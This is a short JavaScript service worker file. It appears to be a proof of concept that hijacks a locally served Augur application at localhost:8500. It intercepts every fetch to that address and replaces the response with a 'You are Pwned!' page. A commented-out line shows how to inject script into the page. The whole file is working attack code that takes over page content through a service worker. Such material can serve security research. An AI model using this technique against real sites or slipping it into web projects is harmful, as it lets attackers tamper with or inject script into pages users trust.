self.addEventListener('install', function(event) {
  // Perform install steps
  //
  console.log('Service worker installing...');
  self.skipWaiting();
});

self.addEventListener('activate', function(event) {
  console.log('Service worker activating...');
	clients.claim();
});


self.addEventListener('fetch', function(event) {
  console.log('Fetching:', event.request.url);
  if (event.request.url.startsWith("http://localhost:8500")) {
    // Main Augur application is loading, inject our custom script into it
    event.respondWith(fetch(event.request.url)
    .then(function(response) {
      return response.text();
    })
    .then(function(text) {
      //return new Response(text + '\nsetTimeout(function() { alert("You are Pwned!") }, 3000);');
      return new Response('<h1>"You are Pwned!"</h1>');
    }));
  }
});

